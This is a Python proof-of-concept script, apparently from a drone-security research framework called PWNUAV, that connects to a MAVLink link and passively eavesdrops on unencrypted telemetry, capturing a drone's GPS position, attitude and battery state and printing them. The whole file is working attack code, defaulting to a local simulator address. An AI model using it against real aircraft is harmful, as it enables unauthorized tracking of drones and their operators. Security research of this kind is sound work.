"""PoC 02 - Telemetry eavesdropping (PWNUAV IA-01, PA-01, IM-04).

Passively reads position, attitude and battery from the unencrypted link.
"""
from __future__ import annotations

import argparse
import time
from dataclasses import dataclass

from pwnuav.link import announce, connect


@dataclass
class Telemetry:
    lat: float | None = None
    lon: float | None = None
    alt_m: float | None = None
    roll: float | None = None
    pitch: float | None = None
    yaw: float | None = None
    battery_v: float | None = None
    battery_pct: int | None = None


def run_eavesdrop(conn_str: str, duration: float = 3.0) -> Telemetry:
    master = connect(conn_str)
    announce(master)
    t = Telemetry()
    deadline = time.time() + duration
    while time.time() < deadline:
        msg = master.recv_match(
            type=["GLOBAL_POSITION_INT", "ATTITUDE", "SYS_STATUS"],
            blocking=True, timeout=0.5,
        )
        if msg is None:
            continue
        mt = msg.get_type()
        if mt == "GLOBAL_POSITION_INT":
            t.lat = msg.lat / 1e7
            t.lon = msg.lon / 1e7
            t.alt_m = msg.alt / 1000.0
        elif mt == "ATTITUDE":
            t.roll, t.pitch, t.yaw = msg.roll, msg.pitch, msg.yaw
        elif mt == "SYS_STATUS":
            t.battery_v = msg.voltage_battery / 1000.0
            t.battery_pct = msg.battery_remaining
    master.close()
    return t


def main() -> None:
    ap = argparse.ArgumentParser(
        description="PWNUAV PoC 02 - Telemetry eavesdropping")
    ap.add_argument("--connect", default="udpout:127.0.0.1:14550")
    ap.add_argument("--duration", type=float, default=3.0)
    args = ap.parse_args()
    t = run_eavesdrop(args.connect, args.duration)
    print("[+] Telemetry captured (cleartext link):")
    print(f"    pos:       lat={t.lat} lon={t.lon} alt={t.alt_m} m")
    print(f"    attitude:  roll={t.roll} pitch={t.pitch} yaw={t.yaw}")
    print(f"    battery:   {t.battery_v} V ({t.battery_pct} %)")


if __name__ == "__main__":
    main()
